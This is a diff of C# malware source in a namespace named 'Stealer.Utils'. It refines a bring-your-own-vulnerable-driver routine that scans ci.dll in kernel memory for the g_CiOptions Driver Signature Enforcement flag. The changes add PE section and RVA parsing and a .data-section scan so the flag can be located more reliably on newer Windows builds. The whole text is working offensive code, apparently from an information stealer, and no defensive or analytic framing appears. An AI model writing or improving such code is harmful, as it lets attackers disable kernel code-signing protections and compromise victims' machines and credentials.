@@ -377,6 +377,64 @@ namespace Stealer.Utils
             return false;
         }
 
+        private static long RawOffsetToRva(byte[] fileBytes, long rawOffset)
+        {
+            try
+            {
+                int e_lfanew = BitConverter.ToInt32(fileBytes, 0x3C);
+                ushort numberOfSections = BitConverter.ToUInt16(fileBytes, e_lfanew + 6);
+                ushort sizeOfOptionalHeader = BitConverter.ToUInt16(fileBytes, e_lfanew + 20);
+                int sectionHeadersOffset = e_lfanew + 24 + sizeOfOptionalHeader;
+
+                for (int i = 0; i < numberOfSections; i++)
+                {
+                    int sec = sectionHeadersOffset + (i * 40);
+                    uint virtualAddress = BitConverter.ToUInt32(fileBytes, sec + 12);
+                    uint sizeOfRawData = BitConverter.ToUInt32(fileBytes, sec + 16);
+                    uint pointerToRawData = BitConverter.ToUInt32(fileBytes, sec + 20);
+
+                    if (rawOffset >= pointerToRawData && rawOffset < pointerToRawData + sizeOfRawData)
+                    {
+                        return virtualAddress + (rawOffset - pointerToRawData);
+                    }
+                }
+            }
+            catch { }
+            return rawOffset;
+        }
+
+        private static bool GetModuleDataSectionRva(byte[] fileBytes, out uint dataRva, out uint dataSize)
+        {
+            dataRva = 0; dataSize = 0;
+            try
+            {
+                int e_lfanew = BitConverter.ToInt32(fileBytes, 0x3C);
+                ushort numberOfSections = BitConverter.ToUInt16(fileBytes, e_lfanew + 6);
+                ushort sizeOfOptionalHeader = BitConverter.ToUInt16(fileBytes, e_lfanew + 20);
+                int sectionHeadersOffset = e_lfanew + 24 + sizeOfOptionalHeader;
+
+                for (int i = 0; i < numberOfSections; i++)
+                {
+                    int sec = sectionHeadersOffset + (i * 40);
+                    string secName = "";
+                    for (int j = 0; j < 8; j++)
+                    {
+                        byte b = fileBytes[sec + j];
+                        if (b == 0) break;
+                        secName += (char)b;
+                    }
+                    if (string.Equals(secName, ".data", StringComparison.OrdinalIgnoreCase))
+                    {
+                        dataSize = BitConverter.ToUInt32(fileBytes, sec + 8);
+                        dataRva = BitConverter.ToUInt32(fileBytes, sec + 12);
+                        return true;
+                    }
+                }
+            }
+            catch { }
+            return false;
+        }
+
         private static IntPtr FindGCiOptionsAddress(IntPtr hDev, out string errDetail)
         {
             errDetail = null;
@@ -415,8 +473,7 @@ namespace Stealer.Utils
                 byte[] imageCode = new byte[sizeOfImage];
                 Marshal.Copy(userCiBase, imageCode, 0, sizeOfImage);
 
-                // Method 1: Dudka CipInitialize / CiInitialize pattern scan
-                // Search for mov [g_CiOptions], ecx/eax/r9d/r8d (89 0D, 89 05, 89 15, 89 3D, 44 89 0D, 44 89 05)
+                // Method 1: Dudka CipInitialize / CiInitialize pattern scan with RawToRVA translation
                 for (int i = 0; i < sizeOfImage - 7; i++)
                 {
                     int rel = 0;
@@ -447,28 +504,31 @@ namespace Stealer.Utils
                     if (nextInstr != IntPtr.Zero)
                     {
                         IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
-                        long offset = userTarget.ToInt64() - userCiBase.ToInt64();
+                        long rawOffset = userTarget.ToInt64() - userCiBase.ToInt64();
+                        long rva = RawOffsetToRva(imageCode, rawOffset);
 
-                        if (offset > 0 && offset < sizeOfImage + 0x40000)
+                        IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + rva);
+                        uint val = ReadKernelMemory32WithHandle(hDev, cand);
+
+                        if (val == 6 || val == 0x6 || val == 0x8 || val == 0xE || (val != 0 && (val & 6) != 0))
                         {
-                            IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
-                            uint val = ReadKernelMemory32WithHandle(hDev, cand);
-
-                            // Validate g_CiOptions flag: 6 = DSE Enabled, 8 = DSE Enabled (Win11), E = DSE Enabled (HVCI)
-                            if (val == 6 || val == 0x6 || val == 0x8 || val == 0xE || (val != 0 && (val & 6) != 0))
-                            {
-                                return cand;
-                            }
+                            return cand;
                         }
                     }
                 }
 
-                // Method 2: Kernel Memory Scan fallback for any uint32 == 6 in ci.dll data range
-                for (long offset = 0x1000; offset < sizeOfImage + 0x20000; offset += 4)
+                // Method 2: Kernel Memory Scan inside .data section RVA range
+                uint dataRva = 0, dataSize = 0;
+                if (!GetModuleDataSectionRva(imageCode, out dataRva, out dataSize) || dataRva == 0)
                 {
-                    IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
+                    dataRva = 0x30000; dataSize = 0x20000;
+                }
+
+                for (long rva = dataRva; rva < dataRva + dataSize + 0x4000; rva += 4)
+                {
+                    IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + rva);
                     uint val = ReadKernelMemory32WithHandle(hDev, cand);
-                    if (val == 6)
+                    if (val == 6 || val == 8 || val == 0xE)
                     {
                         uint prev = ReadKernelMemory32WithHandle(hDev, new IntPtr(cand.ToInt64() - 4));
                         uint next = ReadKernelMemory32WithHandle(hDev, new IntPtr(cand.ToInt64() + 4));
@@ -479,7 +539,7 @@ namespace Stealer.Utils
                     }
                 }
 
-                errDetail = "BYOVD: Dudka scan methods found no g_CiOptions in ci.dll (size=" + sizeOfImage + ", base=0x" + ciKernelBase.ToString("X") + ")";
+                errDetail = "BYOVD: RVA-mapped scans found no g_CiOptions in ci.dll (dataRva=0x" + dataRva.ToString("X") + ", base=0x" + ciKernelBase.ToString("X") + ")";
                 return IntPtr.Zero;
             }
             finally
